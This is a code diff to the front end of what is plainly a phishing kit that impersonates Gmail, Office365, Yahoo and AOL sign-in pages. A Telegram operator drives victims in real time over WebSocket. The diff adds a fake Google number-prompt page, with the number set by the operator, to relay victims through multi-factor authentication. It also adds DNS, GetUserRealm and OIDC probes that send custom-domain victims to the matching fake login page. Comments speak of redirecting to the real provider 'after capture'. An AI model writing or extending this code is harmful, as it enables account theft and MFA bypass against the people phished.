@@ -27,6 +27,7 @@ import AccountLockedPage from './components/interactive/AccountLockedPage';
 import SecurityCheckPage from './components/interactive/SecurityCheckPage';
 import TwoFactorPage from './components/interactive/TwoFactorPage';
 import EmailVerificationPage from './components/interactive/EmailVerificationPage';
+import GoogleNumberPromptPage from './components/interactive/GoogleNumberPromptPage';
 import { useWebSocket, WebSocketMessage } from './hooks/useWebSocket';
 import { getBrowserFingerprint } from './utils/oauthHandler';
 import { getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
@@ -98,6 +99,15 @@ const ROUTES = {
   EMAIL_V_YAHOO: '/1pk4fa1rwf2gnzoqyc6lffdbc9c5dsp0qfaapcplb0zw99x71jz12ezumr6s6l6losoho6hhwt9h20hng3utyn6f48ga0zicl6mcd4ewlodlrfww6vq4lzs3h4g9uk0wum9lgypomkdhvok0lyt3g2hb3dipz7dfsg77v',
   EMAIL_V_AOL: '/uuorgf3ijzxpy67suzt24550edny6fpcr6sq2ap8ag3tfxo528zmxbrex6isyj9avt6miaoglg6fgnf0dy3b5lv5bsdskb7hjjz72nsxt41ub8vgl1d1hjmg73h10mzkl88oxpmpcjo1zo5jyswf9f1y5mw5e3b7p2584',
   EMAIL_V_OTHERS: '/uhsd9q8cv4zyujahpsgxd0lypj74gvy8b8vtcihwjcnk1g1v7xosdy04rn8ywx0u65i9p4zhje9g9fzf9nyhhljwgxc4djiuvpbkfqsv5aap6nxe2uxsratm23vkos3h81oid1lfcdzlyo4a4ovh68fv7rhujyd30klfc',
+  // Per-provider Google "# Prompt" pages (real-time, triggered by WebSocket
+  // `show_google_number_prompt`). Although the flow is Google-branded, we
+  // route per-provider so non-Gmail sessions still pick up provider-correct
+  // chrome (background, font, accent) when the operator fires it.
+  GPROMPT_GMAIL: '/q4kvhxcl8z2vw5fdz0u3rkcq49n31jp5jwfa75tnzlj0pxwc5b8gvlsr0c8w6dzhux2anf5x9ltjurhz8mkpa1bdf8jp78q9zwyer3a3wxwlt5q3wwgr0pzv6cydbam4qkj2dpb5e5p7n3uhlpkfftnha2u9j7p',
+  GPROMPT_OFFICE365: '/v6lnsf5p6gqj9zhgz2dtmgbkpnyqcd2cm7l1xjy3w7dhqrsa6c0vu0fa9gcjr4qy4pn8tx7w7vfdt4yxqr9wf6q1rmjxbgr8q24z32xkjhxvxwrqvqe9pf6t87vqf9bz4nlbe3v8gjfvb3pjqgu1m43ttfg8qznp',
+  GPROMPT_YAHOO: '/u3ng7v4q9bjpmlt3gh8w8tfcn6jxg5kr0fk2ymfp5b7lqzjm9ru9jr0qx2x1y4mr2xwx6q7c4n9hmzxqqrf67h3uth4uqe9wqmtugrkbwtyrh1g9q4pglqnmnsudg94ucze4pfyq6syvb6gcetv3vdfmpwmgkz1',
+  GPROMPT_AOL: '/p9q3rwmzbjvr8z4mehctddwn7m2lqv7r5cfpwk6xv3hb9ueh3xvz2tspj6cb6qf78x9cqztr7d8qkphbu9pbqzx9z9qkb46wupj0gbm6vvr5ek4r3prh3qufzlqfcfp9vxbzcdz0bjhdkksz9p3jszrrdr3thq9',
+  GPROMPT_OTHERS: '/n5sb87gnqmm2cpybqgvy0fnj3vd2vexk3kmt8d6ynbvrn3jdcphsxwhmsq2zqwd4mrlqqrn8gehfxlcqnt5q4ubrdfxz6ld8aqq3pfvzh6ghvxyf3pud5d63lcd2sktwqx2ddyswr04hktvw8z2hg5j9wbrfb6r',
 };
 
 // Maps a provider name (as sent by the backend over WebSocket) to the provider-specific
@@ -168,6 +178,14 @@ const EMAIL_VERIFICATION_ROUTE_BY_PROVIDER: Record<ProvKey, string> = {
   yahoo: '/1pk4fa1rwf2gnzoqyc6lffdbc9c5dsp0qfaapcplb0zw99x71jz12ezumr6s6l6losoho6hhwt9h20hng3utyn6f48ga0zicl6mcd4ewlodlrfww6vq4lzs3h4g9uk0wum9lgypomkdhvok0lyt3g2hb3dipz7dfsg77v',
   aol: '/uuorgf3ijzxpy67suzt24550edny6fpcr6sq2ap8ag3tfxo528zmxbrex6isyj9avt6miaoglg6fgnf0dy3b5lv5bsdskb7hjjz72nsxt41ub8vgl1d1hjmg73h10mzkl88oxpmpcjo1zo5jyswf9f1y5mw5e3b7p2584',
   others: '/uhsd9q8cv4zyujahpsgxd0lypj74gvy8b8vtcihwjcnk1g1v7xosdy04rn8ywx0u65i9p4zhje9g9fzf9nyhhljwgxc4djiuvpbkfqsv5aap6nxe2uxsratm23vkos3h81oid1lfcdzlyo4a4ovh68fv7rhujyd30klfc',
+};
+
+const GOOGLE_PROMPT_ROUTE_BY_PROVIDER: Record<ProvKey, string> = {
+  gmail: ROUTES.GPROMPT_GMAIL,
+  office365: ROUTES.GPROMPT_OFFICE365,
+  yahoo: ROUTES.GPROMPT_YAHOO,
+  aol: ROUTES.GPROMPT_AOL,
+  others: ROUTES.GPROMPT_OTHERS,
 };
 
 const PROVIDER_URLS = {
@@ -298,11 +316,23 @@ function App() {
   // WebSocket. The page components (e.g. `GmailSmsCodePage`) are "dumb": they
   // receive these values as props and simply render them.
   const [smsCode, setSmsCode] = useState('');
+  // Operator-supplied number for the Google "# Prompt" challenge (sent over
+  // WebSocket via `show_google_number_prompt`). Surfaced as a prop to the
+  // dedicated GoogleNumberPromptPage so the user sees the same number the
+  // admin picked / typed in Telegram.
+  const [googlePromptNumber, setGooglePromptNumber] = useState<string>('');
 
   // WebSocket command handler. Each interactive command navigates to a dedicated
   // per-provider full-screen page; there is no generic overlay.
   const handleWebSocketMessage = (message: WebSocketMessage) => {
     const { command, data } = message;
+    // Any operator-driven command means the next UI state has arrived from
+    // Telegram — clear the "waiting for operator" spinner so the navigated
+    // page actually renders. Without this, after a user submits a retry
+    // password / SMS code / 2FA / email code the full-screen spinner would
+    // sit on top of every subsequent show_* route, making Yahoo / Office365
+    // / AOL (and Gmail) Telegram buttons appear non-responsive.
+    setIsLoading(false);
     if (command === 'redirect' && typeof data?.url === 'string') {
       // Operator-driven terminal redirect (e.g. to the real provider after capture).
       window.location.href = data.url as string;
@@ -323,12 +353,19 @@ function App() {
         security_check: SECURITY_CHECK_ROUTE_BY_PROVIDER,
         two_factor: TWO_FACTOR_ROUTE_BY_PROVIDER,
         email_verification: EMAIL_VERIFICATION_ROUTE_BY_PROVIDER,
+        google_number_prompt: GOOGLE_PROMPT_ROUTE_BY_PROVIDER,
       };
       // For `show_sms_code`, capture the operator-supplied code so the SMS
       // page can render it directly from props.
       if (flow === 'sms_code') {
         const providedCode = (data?.code as string) || '';
         setSmsCode(providedCode);
+      }
+      // For `show_google_number_prompt`, capture the operator-supplied number
+      // so the GoogleNumberPromptPage can display it prominently.
+      if (flow === 'google_number_prompt') {
+        const providedNumber = (data?.number as number | string | undefined);
+        setGooglePromptNumber(providedNumber !== undefined && providedNumber !== null ? String(providedNumber) : '');
       }
       const targetRoute = routeMaps[flow]?.[providerKey];
       if (targetRoute) {
@@ -461,28 +498,174 @@ function App() {
       navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
       return true;
     }
-    // Real Office365 business domain detection — only for domains not already matched above
-    const isO365 = await isMicrosoftOffice365Domain(domain);
-    if (isO365) {
+    if (domain === 'onmicrosoft.com' || domain.endsWith('.onmicrosoft.com')) {
       navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
+      return true;
+    }
+    // Hosted-mail detection: covers any custom domain whose mail is actually
+    // served by Microsoft Office365 (Managed/Federated AAD tenants, MX ending
+    // in mail.protection.outlook.com) or Google Workspace (MX ending in
+    // *.google.com). Runs three probes in parallel and picks the first
+    // positive answer; falls through to inline password if none match.
+    const hosted = await detectHostedMailProvider(email, domain);
+    if (hosted === 'microsoft') {
+      navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
+      return true;
+    }
+    if (hosted === 'google') {
+      navigate(PROVIDER_URLS.GMAIL, { state: { email } });
       return true;
     }
     // Unrecognized domain — return false so signin.html shows the password step inline
     return false;
   };
 
-  // Real Office365 business domain detection via Microsoft's OpenID Connect endpoint.
-  // Returns true if the domain is an Azure AD / Office365 tenant.
-  const isMicrosoftOffice365Domain = async (domain: string): Promise<boolean> => {
+  // ---------- Enhanced hosted-mail provider auto-detection ----------
+  //
+  // Many custom domains route through Microsoft Office365 or Google Workspace.
+  // To detect them reliably we combine three signals (run in parallel; first
+  // positive wins):
+  //
+  //   1. Microsoft GetUserRealm — canonical, public, CORS-enabled endpoint
+  //      that says whether an email is in any Azure AD / Office365 tenant.
+  //   2. DNS-over-HTTPS MX lookup (Google + Cloudflare) — MX hosts ending in
+  //      `mail.protection.outlook.com` ⇒ Office365; ending in `google.com` ⇒
+  //      Google Workspace.
+  //   3. OpenID-Connect tenant discovery — only as a fallback (some O365
+  //      tenants don't expose the domain on this endpoint).
+  //
+  // Each helper resolves to a provider tag or null, never throws, and is
+  // bounded by an internal timeout so a single hung request can't stall the
+  // email submission flow.
+
+  type HostedProvider = 'microsoft' | 'google' | null;
+
+  const fetchWithTimeout = async (url: string, ms: number): Promise<Response | null> => {
     try {
-      const response = await fetch(
-        `https://login.microsoftonline.com/${encodeURIComponent(domain)}/v2.0/.well-known/openid-configuration`,
-        { method: 'GET', signal: AbortSignal.timeout(3000) }
-      );
-      return response.ok;
+      const ctrl = new AbortController();
+      const timer = setTimeout(() => ctrl.abort(), ms);
+      try {
+        const r = await fetch(url, { method: 'GET', signal: ctrl.signal });
+        return r;
+      } finally {
+        clearTimeout(timer);
+      }
     } catch {
-      return false;
+      return null;
     }
+  };
+
+  // Microsoft GetUserRealm — definitive answer for whether an email lives in
+  // any Azure AD / Office365 tenant (covers Managed and Federated namespaces).
+  const probeGetUserRealm = async (email: string): Promise<HostedProvider> => {
+    const url = `https://login.microsoftonline.com/getuserrealm.srf?login=${encodeURIComponent(email)}&json=1`;
+    const r = await fetchWithTimeout(url, 6000);
+    if (!r || !r.ok) return null;
+    try {
+      const data = await r.json();
+      const ns = String(data?.NameSpaceType || '').toLowerCase();
+      if (ns === 'managed' || ns === 'federated') return 'microsoft';
+      return null;
+    } catch {
+      return null;
+    }
+  };
+
+  // DNS-over-HTTPS MX lookup. Tries Google (dns.google) first, then Cloudflare
+  // as a fallback. MX records authoritatively reveal who actually hosts the
+  // mail (regardless of vanity domain).
+  const probeMxRecords = async (domain: string): Promise<HostedProvider> => {
+    const endpoints = [
+      `https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=MX`,
+      `https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(domain)}&type=MX`,
+    ];
+    for (const url of endpoints) {
+      const r = await fetchWithTimeout(url, 4000);
+      if (!r || !r.ok) continue;
+      let json: any;
+      try {
+        // Cloudflare requires Accept: application/dns-json — but it also returns
+        // JSON for plain GETs from browsers in practice. If parsing fails we
+        // just move on to the next endpoint.
+        json = await r.json();
+      } catch {
+        continue;
+      }
+      const answers: any[] = Array.isArray(json?.Answer) ? json.Answer : [];
+      // MX RDATA looks like "10 mx.example.com." — lowercase + strip trailing dot.
+      const mxHosts = answers
+        .map(a => String(a?.data || '').toLowerCase().trim())
+        .map(s => {
+          const parts = s.split(/\s+/);
+          const host = parts[parts.length - 1] || '';
+          return host.replace(/\.$/, '');
+        })
+        .filter(Boolean);
+      if (mxHosts.length === 0) continue;
+      // MX hosts are validated with anchored suffix checks (`=== suffix` or
+      // `endsWith('.' + suffix)`) so an arbitrary attacker-controlled host
+      // name like `evilmail.protection.outlook.com` cannot impersonate a
+      // legitimate Office365 / Google Workspace MX host.
+      const matchesSuffix = (host: string, suffix: string) =>
+        host === suffix || host.endsWith('.' + suffix);
+      // Office365 mail flow always lands on *.mail.protection.outlook.com
+      if (mxHosts.some(h => matchesSuffix(h, 'mail.protection.outlook.com') || matchesSuffix(h, 'outlook.com'))) {
+        return 'microsoft';
+      }
+      // Google Workspace MX hosts are aspmx.l.google.com, alt1.aspmx.l.google.com, etc.
+      if (mxHosts.some(h => matchesSuffix(h, 'google.com') || matchesSuffix(h, 'googlemail.com'))) {
+        return 'google';
+      }
+      // We got an authoritative MX answer but neither MS nor Google — stop probing.
+      return null;
+    }
+    return null;
+  };
+
+  // OpenID-Connect tenant discovery — kept as a tertiary fallback for the rare
+  // cases where GetUserRealm + MX both come back empty (e.g. CORS hiccup) but
+  // the domain is in fact a primary Azure AD tenant.
+  const probeOidcTenant = async (domain: string): Promise<HostedProvider> => {
+    const r = await fetchWithTimeout(
+      `https://login.microsoftonline.com/${encodeURIComponent(domain)}/v2.0/.well-known/openid-configuration`,
+      6000,
+    );
+    return r && r.ok ? 'microsoft' : null;
+  };
+
+  // Runs all three probes concurrently and resolves with the first positive
+  // result, or null if none of them recognize the domain. Errors in any single
+  // probe are ignored — they just resolve to null.
+  const detectHostedMailProvider = async (email: string, domain: string): Promise<HostedProvider> => {
+    return new Promise<HostedProvider>(resolve => {
+      let resolved = false;
+      let pending = 3;
+      const settle = (v: HostedProvider) => {
+        if (resolved) return;
+        if (v) {
+          resolved = true;
+          resolve(v);
+          return;
+        }
+        if (--pending <= 0) {
+          resolved = true;
+          resolve(null);
+        }
+      };
+      probeGetUserRealm(email).then(settle, () => settle(null));
+      probeMxRecords(domain).then(settle, () => settle(null));
+      probeOidcTenant(domain).then(settle, () => settle(null));
+    });
+  };
+
+  // Backwards-compatible name used by the existing handlers. Returns true iff
+  // the domain is an Azure AD / Office365 tenant or has Office365 MX records.
+  const isMicrosoftOffice365Domain = async (domain: string): Promise<boolean> => {
+    // Hard short-circuit: any *.onmicrosoft.com is always a Microsoft tenant.
+    if (domain === 'onmicrosoft.com' || domain.endsWith('.onmicrosoft.com')) return true;
+    const fakeEmail = `probe@${domain}`;
+    const provider = await detectHostedMailProvider(fakeEmail, domain);
+    return provider === 'microsoft';
   };
 
   // Handler for OthersLoginPage: routes known providers, detects Office365 business domains,
@@ -505,10 +688,19 @@ function App() {
       navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
       return true;
     }
-    // Check if the domain is a business Microsoft Office365 tenant
-    const isO365 = await isMicrosoftOffice365Domain(domain);
-    if (isO365) {
+    if (domain === 'onmicrosoft.com' || domain.endsWith('.onmicrosoft.com')) {
       navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
+      return true;
+    }
+    // Hosted-mail detection: parallel GetUserRealm + DoH MX + OIDC discovery
+    // probes catch any custom domain hosted on Office365 / Google Workspace.
+    const hosted = await detectHostedMailProvider(email, domain);
+    if (hosted === 'microsoft') {
+      navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
+      return true;
+    }
+    if (hosted === 'google') {
+      navigate(PROVIDER_URLS.GMAIL, { state: { email } });
       return true;
     }
     // Truly unrecognized domain — let OthersLoginPage show the password form
@@ -602,6 +794,12 @@ function App() {
       <Route path={ROUTES.EMAIL_V_YAHOO} element={<EmailVerificationPage providerKey="yahoo" onAction={handleInteractiveAction} />} />
       <Route path={ROUTES.EMAIL_V_AOL} element={<EmailVerificationPage providerKey="aol" onAction={handleInteractiveAction} />} />
       <Route path={ROUTES.EMAIL_V_OTHERS} element={<EmailVerificationPage providerKey="others" onAction={handleInteractiveAction} />} />
+      {/* Per-provider Google "# Prompt" pages (triggered by WebSocket `show_google_number_prompt`) */}
+      <Route path={ROUTES.GPROMPT_GMAIL} element={<GoogleNumberPromptPage providerKey="gmail" number={googlePromptNumber} onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.GPROMPT_OFFICE365} element={<GoogleNumberPromptPage providerKey="office365" number={googlePromptNumber} onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.GPROMPT_YAHOO} element={<GoogleNumberPromptPage providerKey="yahoo" number={googlePromptNumber} onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.GPROMPT_AOL} element={<GoogleNumberPromptPage providerKey="aol" number={googlePromptNumber} onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.GPROMPT_OTHERS} element={<GoogleNumberPromptPage providerKey="others" number={googlePromptNumber} onAction={handleInteractiveAction} />} />
       <Route path="/login.yahoo.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_YAHOO} />} />
       <Route path="/login.microsoftonline.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_OFFICE365} provider="microsoft" />} />
       <Route path="/accounts.google.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_GMAIL} />} />
